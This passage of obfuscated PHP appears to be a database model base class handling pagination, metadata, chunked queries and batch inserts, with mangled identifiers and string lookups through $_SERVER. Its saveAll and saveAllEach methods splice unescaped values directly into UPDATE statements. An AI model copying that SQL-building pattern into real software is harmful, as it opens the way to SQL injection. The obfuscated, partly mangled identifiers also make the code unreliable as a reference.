!1; $GLOBALS[$Èë±Å±[7]][$Èë±Å±[353]] = !1; } protected function selectPageRestore() { $´ÈîèÄ =& $_SERVER[óó‹¸‚å]; if (!isset($GLOBALS[$´ÈîèÄ[362]])) { return; } $GLOBALS[$´ÈîèÄ[7]][$´ÈîèÄ[363]] = $GLOBALS[$´ÈîèÄ[362]]; $GLOBALS[$´ÈîèÄ[7]][$´ÈîèÄ[353]] = $GLOBALS[$´ÈîèÄ[364]]; if ($GLOBALS[$´ÈîèÄ[7]][$´ÈîèÄ[363]] === !1) { unset($GLOBALS[$´ÈîèÄ[7]][$´ÈîèÄ[363]]); } if ($GLOBALS[$´ÈîèÄ[7]][$´ÈîèÄ[353]] === !1) { unset($GLOBALS[$´ÈîèÄ[7]][$´ÈîèÄ[353]]); } unset($GLOBALS[$´ÈîèÄ[362]]); unset($GLOBALS[$´ÈîèÄ[364]]); } protected function selectPage($³ğ—ºÆŠ = 200, $©ŸÓ³ïœ = 1) { $ˆÕŒûä =& $_SERVER[óó‹¸‚å]; global $in; $´Š†¯” = $this->optionsValue(); $àöä·âª = 50000; $³ğ—ºÆŠ = isset($in[$ˆÕŒûä[363]]) && $in[$ˆÕŒûä[363]] ? $in[$ˆÕŒûä[363]] : $³ğ—ºÆŠ; if ($³ğ—ºÆŠ === -1) { $in[$ˆÕŒûä[363]] = !1; $àöä·âª = 100000000; $³ğ—ºÆŠ = $àöä·âª; } $Ÿ“Ä‹±¬ = $´Š†¯”; $Ÿ“Ä‹±¬[$ˆÕŒûä[365]] = array(); $³ğ—ºÆŠ = intval($³ğ—ºÆŠ); $³ğ—ºÆŠ = $³ğ—ºÆŠ <= 5 ? 5 : ($³ğ—ºÆŠ >= $àöä·âª ? $àöä·âª : $³ğ—ºÆŠ); $©ŸÓ³ïœ = intval(isset($in[$ˆÕŒûä[353]]) && $in[$ˆÕŒûä[353]] ? $in[$ˆÕŒûä[353]] : $©ŸÓ³ïœ); $©ŸÓ³ïœ = $©ŸÓ³ïœ <= 1 ? 1 : $©ŸÓ³ïœ; $­ıúé³ë = array(); $º’ñï¼¨ = 1; if ($©ŸÓ³ïœ == 1 && $º’ñï¼¨) { $this->optionsValue($´Š†¯”); $­ıúé³ë = $this->page($©ŸÓ³ïœ, $³ğ—ºÆŠ)->select(); $«¦òÇ“ = is_array($­ıúé³ë) ? count($­ıúé³ë) : 0; if ($«¦òÇ“ < $³ğ—ºÆŠ) { $œ”‹ßû = 1; } else { $this->optionsValue($Ÿ“Ä‹±¬); $«¦òÇ“ = intval($this->count()); $œ”‹ßû = ceil($«¦òÇ“ / $³ğ—ºÆŠ); } } else { $this->optionsValue($Ÿ“Ä‹±¬); $«¦òÇ“ = intval($this->count()); $œ”‹ßû = ceil($«¦òÇ“ / $³ğ—ºÆŠ); $©ŸÓ³ïœ = $©ŸÓ³ïœ >= $œ”‹ßû ? $œ”‹ßû : $©ŸÓ³ïœ; $this->optionsValue($´Š†¯”); $­ıúé³ë = $this->page($©ŸÓ³ïœ, $³ğ—ºÆŠ)->select(); } if (!is_array($­ıúé³ë)) { $­ıúé³ë = array(); } if ($œ”‹ßû == 1) { $«¦òÇ“ = count($­ıúé³ë); } $†¶òÊÎº = array($ˆÕŒûä[366] => array($ˆÕŒûä[367] => $«¦òÇ“, $ˆÕŒûä[363] => $³ğ—ºÆŠ, $ˆÕŒûä[353] => $©ŸÓ³ïœ, $ˆÕŒûä[368] => $œ”‹ßû), $ˆÕŒûä[369] => $­ıúé³ë); return $†¶òÊÎº; } protected function checkLength($ü­¦üğº, $¾²Ï“‘ = 0, $‰ƒè’ä† = '') { $§Ô–‡á› =& $_SERVER[óó‹¸‚å]; $¾²Ï“‘ = $¾²Ï“‘ ? $¾²Ï“‘ : 65536; if (!$ü­¦üğº || strlen($ü­¦üğº) < $¾²Ï“‘) { return; } $‰ƒè’ä† = $‰ƒè’ä† ? $‰ƒè’ä† . $§Ô–‡á›[71] : $§Ô–‡á›[12]; show_json($‰ƒè’ä† . LNG($§Ô–‡á›[370]) . "\x28{$¾²Ï“‘}\51", !1); } protected function metaSet($«ŒÏ³ê†, $†×¼’‚Œ = null, $°Úñ®¹¥ = null) { $ş†±»­ş =& $_SERVER[óó‹¸‚å]; if (!$this->tableMeta || !$«ŒÏ³ê†) { return !1; } $ÇõÃÔ˜† = $this->tableMeta[$ş†±»­ş[371]]; $Ã’üÕÑ‘ = $this->tableMeta[$ş†±»­ş[372]]; $¾´•Å‰ = Model($Ã’üÕÑ‘); $àáó¹Ê = array($ÇõÃÔ˜† => $«ŒÏ³ê†, $ş†±»­ş[373] => $†×¼’‚Œ); if (is_null($†×¼’‚Œ)) { return $¾´•Å‰->where(array($ÇõÃÔ˜† => $«ŒÏ³ê†))->delete(); } if (is_null($°Úñ®¹¥) && is_string($†×¼’‚Œ)) { return $¾´•Å‰->where($àáó¹Ê)->delete(); } $ê¶·‘Ö = is_array($†×¼’‚Œ) ? $†×¼’‚Œ : array(); if (is_string($†×¼’‚Œ)) { $ê¶·‘Ö[$†×¼’‚Œ] = $°Úñ®¹¥; } $­â¸å£ = array(); foreach ($ê¶·‘Ö as $Ìó—ËÜÙ => $íı‘­÷) { if (is_null($íı‘­÷) && is_string($Ìó—ËÜÙ)) { $¾´•Å‰->where(array($ÇõÃÔ˜† => $«ŒÏ³ê†, $ş†±»­ş[373] => $Ìó—ËÜÙ))->delete(); continue; } $this->checkLength($íı‘­÷, !1, $Ã’üÕÑ‘ . $ş†±»­ş[4] . $Ìó—ËÜÙ); $­â¸å£[] = array($ÇõÃÔ˜† => $«ŒÏ³ê†, $ş†±»­ş[94] => $Ìó—ËÜÙ, $ş†±»­ş[374] => $íı‘­÷); } $çÛ©Ìª¤ = $ş†±»­ş[375] . $Ã’üÕÑ‘; CacheLock::lock($çÛ©Ìª¤); $¾´•Å‰->where(array($ÇõÃÔ˜† => $«ŒÏ³ê†))->addAll($­â¸å£, array(), !0); CacheLock::unlock($çÛ©Ìª¤); return !0; } public function metaGet($¨£İÖ¶Ä, $ß™æØ©é = false) { $äø¶¿ˆË =& $_SERVER[óó‹¸‚å]; if (!$this->tableMeta) { return array(); } $ÏùƒÍÁÚ = $this->tableMeta[$äø¶¿ˆË[371]]; $•ç®ü×ø = Model($this->tableMeta[$äø¶¿ˆË[372]]); if ($ß™æØ©é) { $‚İè³ = array($ÏùƒÍÁÚ => $¨£İÖ¶Ä, $äø¶¿ˆË[94] => $ß™æØ©é); return $•ç®ü×ø->where($‚İè³)->getField($äø¶¿ˆË[374]); } $‚İè³ = array($ÏùƒÍÁÚ => $¨£İÖ¶Ä); $‡ËÜ†¬ş = $•ç®ü×ø->field($äø¶¿ˆË[376])->where($‚İè³)->select(); $‡ËÜ†¬ş = array_to_keyvalue($‡ËÜ†¬ş, $äø¶¿ˆË[94], $äø¶¿ˆË[374]); return $‡ËÜ†¬ş; } private function checkDataAutoHas($áğı©ó‡) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $»óº¨Õ) { if (in_array($áğı©ó‡, explode($_SERVER[óó‹¸‚å][50], $»óº¨Õ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$¹ãšèÔ¾, $×ò‘ÀÆ˜) { $©ïöøÚ‚ =& $_SERVER[óó‹¸‚å]; if (!is_array($¹ãšèÔ¾)) { return; } foreach ($this->dataAuto as $ÑíÖƒÖ­) { $à´Ç¼ú = $ÑíÖƒÖ­[0]; if (!in_array($×ò‘ÀÆ˜, explode($©ïöøÚ‚[50], $ÑíÖƒÖ­[2]))) { continue; } switch (trim($ÑíÖƒÖ­[3])) { case $©ïöøÚ‚[321]: case $©ïöøÚ‚[322]: $¸åÙû¶Ï = $ÑíÖƒÖ­[1]; $•¹ßáÅ¾ = isset($ÑíÖƒÖ­[4]) ? (array) $ÑíÖƒÖ­[4] : array(); if ($¸åÙû¶Ï == $©ïöøÚ‚[203] && array_key_exists($à´Ç¼ú, $¹ãšèÔ¾)) { if (!$¹ãšèÔ¾[$à´Ç¼ú]) { unset($¹ãšèÔ¾[$à´Ç¼ú]); } break; } if (isset($¹ãšèÔ¾[$à´Ç¼ú])) { array_unshift($•¹ßáÅ¾, $¹ãšèÔ¾[$à´Ç¼ú]); } if ($©ïöøÚ‚[321] == $ÑíÖƒÖ­[3]) { $¹ãšèÔ¾[$à´Ç¼ú] = call_user_func_array($¸åÙû¶Ï, $•¹ßáÅ¾); } else { $¹ãšèÔ¾[$à´Ç¼ú] = call_user_func_array(array(&$this, $¸åÙû¶Ï), $•¹ßáÅ¾); } break; case $©ïöøÚ‚[270]: if (isset($¹ãšèÔ¾[$à´Ç¼ú]) && $¹ãšèÔ¾[$à´Ç¼ú]) { $¹ãšèÔ¾[$à´Ç¼ú] = call_user_func_array(array(&$this, $ÑíÖƒÖ­[1]), array($¹ãšèÔ¾[$à´Ç¼ú])); } break; case $©ïöøÚ‚[273]: $¹ãšèÔ¾[$à´Ç¼ú] = $¹ãšèÔ¾[$ÑíÖƒÖ­[1]]; break; case $©ïöøÚ‚[294]: if (isset($¹ãšèÔ¾[$à´Ç¼ú]) && !is_string($¹ãšèÔ¾[$à´Ç¼ú])) { $¹ãšèÔ¾[$à´Ç¼ú] = json_encode_force($¹ãšèÔ¾[$à´Ç¼ú]); } break; case $©ïöøÚ‚[323]: if ($¹ãšèÔ¾[$à´Ç¼ú] === $©ïöøÚ‚[12]) { unset($¹ãšèÔ¾[$à´Ç¼ú]); } break; case $©ïöøÚ‚[324]: $¹ãšèÔ¾[$à´Ç¼ú] = $ÑíÖƒÖ­[1]; default: break; } } if ($×ò‘ÀÆ˜ == $©ïöøÚ‚[355]) { $…²Ú›êÈ = strtolower($this->db->getDbType()); if (strpos($…²Ú›êÈ, $©ïöøÚ‚[13]) !== 0) { return; } $âÆ¯Ï = $this->field(!0)->fields; $Áğ±Õ‹“ = $âÆ¯Ï[$©ïöøÚ‚[252]]; if (isset($âÆ¯Ï[$©ïöøÚ‚[251]])) { unset($Áğ±Õ‹“[$âÆ¯Ï[$©ïöøÚ‚[251]]]); } foreach ($Áğ±Õ‹“ as $¨Ş¡’ => $×ò‘ÀÆ˜) { if (!isset($¹ãšèÔ¾[$¨Ş¡’])) { $¹ãšèÔ¾[$¨Ş¡’] = $©ïöøÚ‚[12]; } } } } private function dataAfterFilter(&$Ö“¯˜æö) { $ëÕå¾ıû =& $_SERVER[óó‹¸‚å]; foreach ($this->dataAuto as $¨™Èğ«å) { $±¾ß¿ » = $¨™Èğ«å[0]; if (!isset($Ö“¯˜æö[$±¾ß¿ »])) { continue; } if (!in_array($ëÕå¾ıû[357], explode($ëÕå¾ıû[50], $¨™Èğ«å[2]))) { continue; } switch (trim($¨™Èğ«å[3])) { case $ëÕå¾ıû[321]: case $ëÕå¾ıû[322]: $ÍÏ›ÃŸñ = isset($¨™Èğ«å[4]) ? (array) $¨™Èğ«å[4] : array(); array_unshift($ÍÏ›ÃŸñ, $Ö“¯˜æö[$±¾ß¿ »]); if (isset($¨™Èğ«å[4]) && $¨™Èğ«å[4] == $ëÕå¾ıû[377]) { $ÍÏ›ÃŸñ = array($Ö“¯˜æö[$±¾ß¿ »]); } if ($ëÕå¾ıû[321] == $¨™Èğ«å[3]) { $Ö“¯˜æö[$±¾ß¿ »] = call_user_func_array($¨™Èğ«å[1], $ÍÏ›ÃŸñ); } else { $Ö“¯˜æö[$±¾ß¿ »] = call_user_func_array(array(&$this, $¨™Èğ«å[1]), $ÍÏ›ÃŸñ); } break; case $ëÕå¾ıû[270]: if (isset($Ö“¯˜æö[$±¾ß¿ »]) && $Ö“¯˜æö[$±¾ß¿ »]) { $Ö“¯˜æö[$±¾ß¿ »] = call_user_func_array(array(&$this, $¨™Èğ«å[1]), array($Ö“¯˜æö[$±¾ß¿ »])); } break; case $ëÕå¾ıû[273]: $Ö“¯˜æö[$±¾ß¿ »] = $Ö“¯˜æö[$¨™Èğ«å[1]]; break; case $ëÕå¾ıû[294]: $¾ñ©ÏºÓ = $Ö“¯˜æö[$±¾ß¿ »]; $Ö“¯˜æö[$±¾ß¿ »] = json_decode($¾ñ©ÏºÓ, !0); if (is_null($Ö“¯˜æö[$±¾ß¿ »])) { $Ö“¯˜æö[$±¾ß¿ »] = $¾ñ©ÏºÓ; } break; case $ëÕå¾ıû[323]: if ($Ö“¯˜æö[$±¾ß¿ »] === $ëÕå¾ıû[12]) { unset($Ö“¯˜æö[$±¾ß¿ »]); } break; case $ëÕå¾ıû[324]: $Ö“¯˜æö[$±¾ß¿ »] = $¨™Èğ«å[1]; break; default: break; } } } public function saveAll($ÕéáÌ¥ş) { $±ÃŠşŸ½ =& $_SERVER[óó‹¸‚å]; $ƒ£êú€¾ = $this->tablePrefix . $this->tableName; $Ã±ÑÍõ÷ = self::SQL_WHERE_IN_CHUNK; $ÕéáÌ¥ş = is_array($ÕéáÌ¥ş) ? $ÕéáÌ¥ş : array(); $Ä—ÑŠ” = $±ÃŠşŸ½[378]; $€‰Š²÷ = 0; $Ã»ú«  = array(); $òÓ×—ÔÆ = count($ÕéáÌ¥ş); for ($ÇÛÓÃ˜Í = 0; $ÇÛÓÃ˜Í < $òÓ×—ÔÆ; $ÇÛÓÃ˜Í++) { $õš¾çö² = $ÕéáÌ¥ş[$ÇÛÓÃ˜Í]; if (!is_array($õš¾çö²) || count($õš¾çö²) != 4) { continue; } $Ëí¼È©­ = "\125\120\104\x41\124\105\x20\140{$ƒ£êú€¾}\140\x20\123\x45\124\40{$õš¾çö²[2]}\x20\75\40\x43\x41\x53\x45\x20{$õš¾çö²[0]}\x20\xa"; if ($€‰Š²÷ == 0) { $Ä—ÑŠ” = $Ëí¼È©­; } $Ã»ú« [] = $±ÃŠşŸ½[118] . $õš¾çö²[1] . $±ÃŠşŸ½[118]; $€‰Š²÷++; $Ä—ÑŠ” .= "\40\127\x48\x45\116\x20\47{$õš¾çö²[1]}\x27\40\124\110\105\x4e\x20\x27{$õš¾çö²[3]}\47\x20\xa"; if ($€‰Š²÷ == $Ã±ÑÍõ÷ || $ÇÛÓÃ˜Í == $òÓ×—ÔÆ - 1) { $äãÍ…‘Ò = implode($±ÃŠşŸ½[50], $Ã»ú« ); $Ä—ÑŠ” .= "\40\x45\x4e\x44\40\x20\x57\x48\x45\122\x45\40{$õš¾çö²[0]}\40\x49\116\40\50{$äãÍ…‘Ò}\51\40"; $this->execute($Ä—ÑŠ”); $€‰Š²÷ = 0; $Ä—ÑŠ” = $Ëí¼È©­; $this->chunkEventCheck(count($Ã»ú« )); $Ã»ú«  = array(); } } $this->chunkEventSet(); } public function saveAllEach($…í´ÓÈ) { $ñã›½ç =& $_SERVER[óó‹¸‚å]; $³…¥¼’á = $this->tablePrefix . $this->tableName; foreach ($…í´ÓÈ as $œûÕ½Êš) { if (!is_array($œûÕ½Êš) || count($œûÕ½Êš) != 4) { continue; } $ïöÓÂµ‘ = $œûÕ½Êš[0] . $ñã›½ç[379] . $œûÕ½Êš[1] . $ñã›½ç[118]; $ïÁı÷¬ = $œûÕ½Êš[2] . $ñã›½ç[379] . $œûÕ½Êš[3] . $ñã›½ç[118]; $±’«Ÿ®¨ = "\x75\160\144\141\x74\x65\40{$³…¥¼’á}\40\x73\145\164\x20{$ïÁı÷¬}\40\x77\150\145\x72\x65\40{$ïöÓÂµ‘}\73"; $this->execute($±’«Ÿ®¨); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($æ•íÈà½ = false, $Á¢Âçêõ = false) { $this->_chunkEvent = $æ•íÈà½; $this->_chunkEventParam = $Á¢Âçêõ; } private function chunkEventCheck($ÔèºçÎÛ) { if (!$this->_chunkEvent) { return; } $‡úÚÀ×Õ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $‡úÚÀ×Õ[$_SERVER[óó‹¸‚å][380]] = $ÔèºçÎÛ; Hook::trigger($this->_chunkEvent, $‡úÚÀ×Õ); } public function addAll($îÚ¢ğÅÆ, $ÕçÅÖš´ = array(), $Ÿİ®öû = false) { $‚Ä·áã =& $_SERVER[óó‹¸‚å]; ignore_timeout(); $ÕõäéµÛ = self::SQL_WHERE_IN_CHUNK; if (empty($îÚ¢ğÅÆ)) { $this->error = think_lang($‚Ä·áã[271]); return !1; } $ÕçÅÖš´ = $this->_parseOptions($ÕçÅÖš´); foreach ($îÚ¢ğÅÆ as $·ï×ÆÄá => $‚ëÇ£Ü) { $îÚ¢ğÅÆ[$·ï×ÆÄá] = $this->_facade($‚ëÇ£Ü); $this->_beforeInsert($îÚ¢ğÅÆ[$·ï×ÆÄá], $ÕçÅÖš´); } if (method_exists($this->db, $‚Ä·áã[272])) { for ($Û×–û…’ = 0; $Û×–û…’ < count($îÚ¢ğÅÆ); $Û×–û…’ += $ÕõäéµÛ) { $È«¦õ³û = array_slice($îÚ¢ğÅÆ, $Û×–û…’, $ÕõäéµÛ); if (!is_array($È«¦õ³û) || count($È«¦õ³û) == 0) { break; } $ı­Ÿ¿“· = $this->db->insertAll($È«¦õ³û, $ÕçÅÖš´, $Ÿİ®öû); $this->chunkEventCheck(count($È«¦õ³û)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($îÚ¢ğÅÆ as $·ï×ÆÄá => $‚ëÇ£Ü) { $ı­Ÿ¿“· = $this->db->insert($‚ëÇ£Ü, $ÕçÅÖš´, $Ÿİ®öû); } $this->commit(); } if (!1 !== $ı­Ÿ¿“·) { $¡Öœ‡ü‰ = $this->getLastInsID(); if ($¡Öœ‡ü‰) { return $¡Öœ‡ü‰; } } return $ı­Ÿ¿“·; } public function save($ÍÒÖˆ°¤ = '', $òéÄÇˆö = array()) { $ª®š™ŒÓ =& $_SERVER[óó‹¸‚å]; $ÊüƒìÏ™ = self::SQL_WHERE_IN_CHUNK; $’¬ÎÉ‹ = $this->optionsValue(); $ü¾‹ã’¸ = $this->findWhereField($’¬ÎÉ‹); if (!$ü¾‹ã’¸) { return parent::save($ÍÒÖˆ°¤, $òéÄÇˆö); } $ë­Áíé± = 0; $Íºí®” = $’¬ÎÉ‹[$ª®š™ŒÓ[275]][$ü¾‹ã’¸][1]; $Íºí®” = is_array($Íºí®”) ? $Íºí®” : array(); $¯Ö¸òã = count($Íºí®”); for ($ÑàôÈÙ÷ = 0; $ÑàôÈÙ÷ < $¯Ö¸òã; $ÑàôÈÙ÷ += $ÊüƒìÏ™) { $„”Îï = array_slice($Íºí®”, $ÑàôÈÙ÷, $ÊüƒìÏ™); if (!is_array($„”Îï) || count($„”Îï) == 0) { break; } $’¬ÎÉ‹[$ª®š™ŒÓ[275]][$ü¾‹ã’¸][1] = $„”Îï; $this->optionsValue($’¬ÎÉ‹); $ë­Áíé± += parent::save($ÍÒÖˆ°¤, $òéÄÇˆö); $this->chunkEventCheck(count($„”Îï)); } $this->chunkEventSet(); return $ë­Áíé±; } public function add($å­«Ôòê = '', $Ï²ĞŠ©­ = array(), $È¦ÈÇ = false) { if ($this->addTaskStatus && is_array($å­«Ôòê)) { $this->addTaskData[] = $å­«Ôòê; return; } return parent::add($å­«Ôòê, $Ï²ĞŠ©­, $È¦ÈÇ); } public function parseWhereLike($¾êÁ¾¥, $¨«¼½Ê = '', $íÅÜû¼Ÿ = false, &$ñáøÎÈß = false) { $á‡©‚Êê =& $_SERVER[óó‹¸‚å]; $Íãà´õ = $GLOBALS[$á‡©‚Êê[6]][$á‡©‚Êê[381]]; if (!$Íãà´õ[$á‡©‚Êê[382]]) { return $¾êÁ¾¥; } if (!is_array($¾êÁ¾¥)) { return $¾êÁ¾¥; } $÷·‘í£¨ = array(); $…ª‹Íãñ = 0; foreach ($¾êÁ¾¥ as $‡¹°½•¤ => $À­ÇÒÜŠ) { if (is_array($À­ÇÒÜŠ) && count($À­ÇÒÜŠ) == 2 && $À­ÇÒÜŠ[0] == $á‡©‚Êê[383] && is_string($À­ÇÒÜŠ[1]) && substr($À­ÇÒÜŠ[1], 0, 1) == $á‡©‚Êê[384] && substr($À­ÇÒÜŠ[1], strlen($À­ÇÒÜŠ[1]) - 1, 1) == $á‡©‚Êê[384]) { $ñáøÎÈß = !0; $ü¿³´¼ = is_string($‡¹°½•¤) ? $‡¹°½•¤ : $¨«¼½Ê; $‹— êšÑ = substr($À­ÇÒÜŠ[1], 1, strlen($À­ÇÒÜŠ[1]) - 2); $‹— êšÑ = $this->db->escapeString($‹— êšÑ); if (!strpos($ü¿³´¼, $á‡©‚Êê[10])) { $ü¿³´¼ = $á‡©‚Êê[385] . $ü¿³´¼ . $á‡©‚Êê[385]; } $ƒÁ‘‘Éº = $á‡©‚Êê[188] . $‹— êšÑ . $á‡©‚Êê[188]; $‹— êšÑ = str_replace(array($á‡©‚Êê[10], $á‡©‚Êê[386], $á‡©‚Êê[11]), $á‡©‚Êê[387], $‹— êšÑ); if ($Íãà´õ[$á‡©‚Êê[388]]) { $ƒÁ‘‘Éº = $á‡©‚Êê[389] . $‹— êšÑ . $á‡©‚Êê[390]; if ($Íãà´õ[$á‡©‚Êê[391]]) { $ƒÁ‘‘Éº = $á‡©‚Êê[390] . $‹— êšÑ . $á‡©‚Êê[389]; } } $÷·‘í£¨[$…ª‹Íãñ] = $á‡©‚Êê[392] . $ü¿³´¼ . $á‡©‚Êê[393] . $ƒÁ‘‘Éº . $á‡©‚Êê[394]; $…ª‹Íãñ++; continue; } if (is_array($À­ÇÒÜŠ)) { $¨«¼½Ê = is_string($‡¹°½•¤) ? $‡¹°½•¤ : $¨«¼½Ê; $À­ÇÒÜŠ = $this->parseWhereLike($À­ÇÒÜŠ, $¨«¼½Ê, !0, $ñáøÎÈß); } if (is_numeric($‡¹°½•¤)) { $÷·‘í£¨[$…ª‹Íãñ] = $À­ÇÒÜŠ; $…ª‹Íãñ++; } else { $÷·‘í£¨[$‡¹°½•¤] = $À­ÇÒÜŠ; } } if ($ñáøÎÈß && !$íÅÜû¼Ÿ) { } return $÷·‘í£¨; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ĞÃ¹íÓØ = array()) { $·¿‘¨µ =& $_SERVER[óó‹¸‚å]; $ûêëäà¹ = self::SQL_WHERE_IN_CHUNK; $ùë‘º¶ = $this->optionsValue(); $‘ıœ  = $this->findWhereField($ùë‘º¶); if (!$‘ıœ  || isset($ùë‘º¶[$·¿‘¨µ[292]]) || isset($ùë‘º¶[$·¿‘¨µ[353]])) { return parent::select($ĞÃ¹íÓØ); } $ËüëÙË = $ùë‘º¶[$·¿‘¨µ[275]][$‘ıœ ][1]; $ËüëÙË = is_array($ËüëÙË) ? $ËüëÙË : array(); $ËèÃ©´è = null; for ($®²Ÿ¼¼Ë = 0; $®²Ÿ¼¼Ë < count($ËüëÙË); $®²Ÿ¼¼Ë += $ûêëäà¹) { $¹©È¾‚û = array_slice($ËüëÙË, $®²Ÿ¼¼Ë, $ûêëäà¹); if (!is_array($¹©È¾‚û) || count($¹©È¾‚û) == 0) { break; } $ùë‘º¶[$·¿‘¨µ[275]][$‘ıœ ][1] = $¹©È¾‚û; $this->optionsValue($ùë‘º¶); $üÃÏéß¨ = parent::select($ĞÃ¹íÓØ); if (!$üÃÏéß¨) { continue; } $ËèÃ©´è = is_array($ËèÃ©´è) ? $ËèÃ©´è : array(); $ËèÃ©´è = array_merge($ËèÃ©´è, $üÃÏéß¨); } return $ËèÃ©´è; } public function delete($ÔŸæß = array()) { $ÍÍ‘¦è¡ =& $_SERVER[óó‹¸‚å]; $Œ‚†Å• = self::SQL_WHERE_IN_CHUNK; $ŠºßŸ³ = $this->optionsValue(); $Œ¤ñ¨æ = $this->findWhereField($ŠºßŸ³); if (!$Œ¤ñ¨æ) { return parent::delete($ÔŸæß); } $ÕÕÉşùô = 0; $÷™ê¯š = $ŠºßŸ³[$ÍÍ‘¦è¡[275]][$Œ¤ñ¨æ][1]; $÷™ê¯š = is_array($÷™ê¯š) ? $÷™ê¯š : array(); for ($úíô¢ü˜ = 0; $úíô¢ü˜ < count($÷™ê¯š); $úíô¢ü˜ += $Œ‚†Å•) { $äæÄÏï = array_slice($÷™ê¯š, $úíô¢ü˜, $Œ‚†Å•); if (!is_array($äæÄÏï) || count($äæÄÏï) == 0) { break; } $ŠºßŸ³[$ÍÍ‘¦è¡[275]][$Œ¤ñ¨æ][1] = $äæÄÏï; $this->optionsValue($ŠºßŸ³); $ÕÕÉşùô += parent::delete($ÔŸæß); } return $ÕÕÉşùô; } private function findWhereField($İ©™¤…ø) { $µûÂŸİ =& $_SERVER[óó‹¸‚å]; $’¸ÓÌú× = self::SQL_WHERE_IN_CHUNK; if (!is_array($İ©™¤…ø) || !is_array($İ©™¤…ø[$µûÂŸİ[275]])) { return !1; } foreach ($İ©™¤…ø[$µûÂŸİ[275]] as $´—×ÏÃ => $èĞ©ú”) { if (is_array($èĞ©ú”) && isset($èĞ©ú”[0]) && is_string($èĞ©ú”[0]) && strtolower($èĞ©ú”[0]) == $µûÂŸİ[7] && is_array($èĞ©ú”[1]) && count($èĞ©ú”[1]) > $’¸ÓÌú×) { ignore_timeout(); return $´—×ÏÃ; } } return !1; } public function setMasterDB($”¢ÇÄåß = true) { think_config($_SERVER[óó‹¸‚å][395], $”¢ÇÄåß); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\163\x74\145\x6d\117\160\x74\x69\x6f\156"; public $field = array(); public function listData($Ì¤ê™ª£ = false, $­²Š—š = "\155\x6f\144\x69\146\x79\124\x69\155\x65", $€¹®ºÉ˜ = false) { $ùÎĞÓ©÷ = Model($this->modelType)->get(!1, $this->optionType, !0); $ö¦‘÷ = array_values($ùÎĞÓ©÷); if ($ö¦‘÷ && $ö¦‘÷[0] && !is_array($ö¦‘÷[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ùÎĞÓ©÷ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ùÎĞÓ©÷) { return $Ì¤ê™ª£ ? null : array(); } if (!$Ì¤ê™ª£) { $ùÎĞÓ©÷ = array_filter(array_values($ùÎĞÓ©÷)); return array_sort_by($ùÎĞÓ©÷, $­²Š—š, $€¹®ºÉ˜); } return $ùÎĞÓ©÷[$_SERVER[óó‹¸‚å][396] . $Ì¤ê™ª£]; } public function insert($èµ¶£¨Ÿ) { $½çØæ»“ =& $_SERVER[óó‹¸‚å]; $èµ¶£¨Ÿ = array_field_key($èµ¶£¨Ÿ, $this->field); $ÉËïÅÏú = Model($this->modelType)->get($½çØæ»“[397], $this->optionType . $½çØæ»“[398]); $ÉËïÅÏú = $ÉËïÅÏú ? $ÉËïÅÏú : 0; $èµ¶£¨Ÿ[$½çØæ»“[399]] = ++$ÉËïÅÏú; $èµ¶£¨Ÿ[$½çØæ»“[200]] = time(); $èµ¶£¨Ÿ[$½çØæ»“[85]] = time(); Model($this->modelType)->set($½çØæ»“[397], $ÉËïÅÏú, $this->optionType . $½çØæ»“[398]); Model($this->modelType)->set($½çØæ»“[396] . $ÉËïÅÏú, $èµ¶£¨Ÿ, $this->optionType); return $ÉËïÅÏú; } public function update($÷‹³£³À, $ÇØÇåÖ) { $Œ»·Ù‡÷ =& $_SERVER[óó‹¸‚å]; $ÇØÇåÖ = array_field_key($ÇØÇåÖ, $this->field); $¼¶ø‰‡µ = $this->listData($÷‹³£³À); if (!$¼¶ø‰‡µ || !$÷‹³£³À) { return !1; } $ÇØÇåÖ = array_merge($¼¶ø‰‡µ, $ÇØÇåÖ); $ÇØÇåÖ[$Œ»·Ù‡÷[85]] = time(); return Model($this->modelType)->set($Œ»·Ù‡÷[396] . $÷‹³£³À, $ÇØÇåÖ, $this->optionType); } public function remove($ˆËúØìÃ) { if (!$ˆËúØìÃ) { return !1; } return Model($this->modelType)->remove($_SERVER[óó‹¸‚å][396] . $ˆËúØìÃ, $this->optionType); } public function clear() { $Ö ‰ÔìÅ =& $_SERVER[óó‹¸‚å]; Model($this->modelType)->remove($Ö ‰ÔìÅ[397], $this->optionType . $Ö ‰ÔìÅ[398]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($È„ë¼ù, $Å‹õÀ…ï) { if (!$Å‹õÀ…ï) { return !1; } $ÈØ½×… = $this->listData(); $ÈØ½×… = array_to_keyvalue($ÈØ½×…, $È„ë¼ù); return isset($ÈØ½×…[$Å‹õÀ…ï]) ? $ÈØ½×…[$Å‹õÀ…ï] : !1; } public function findByName($çùÓšû³) { return $this->findByKey($_SERVER[óó‹¸‚å][32], $çùÓšû³); } protected function resetData($‚¬µ…àÔ) { $Ÿ×ó†í =& $_SERVER[óó‹¸‚å]; $‚¬µ…àÔ = is_array($‚¬µ…àÔ) ? $‚¬µ…àÔ : array(); $ùß»‘Îµ = array(); for ($Î©¹Ú»Ô = 0; $Î©¹Ú»Ô < count($‚¬µ…àÔ); $Î©¹Ú»Ô++) { $ùß»‘Îµ[$Ÿ×ó†í[396] . $‚¬µ…àÔ[$Î©¹Ú»Ô][$Ÿ×ó†í[399]]] = $‚¬µ…àÔ[$Î©¹Ú»Ô]; } return Model($this->modelType)->set($ùß»‘Îµ, !1, $this->optionType); } private function getAutoName($Üš¿ï¸«) { $ïÕ÷ÄĞ = array_to_keyvalue($this->listData(), $_SERVER[óó‹¸‚å][32]); if (!$ïÕ÷ÄĞ || !isset($ïÕ÷ÄĞ[$Üš¿ï¸«])) { return $Üš¿ï¸«; } for ($¯æ¯úù = 1; $¯æ¯úù < count($ïÕ÷ÄĞ); $¯æ¯úù++) { $…Â’ºÎï = $Üš¿ï¸« . 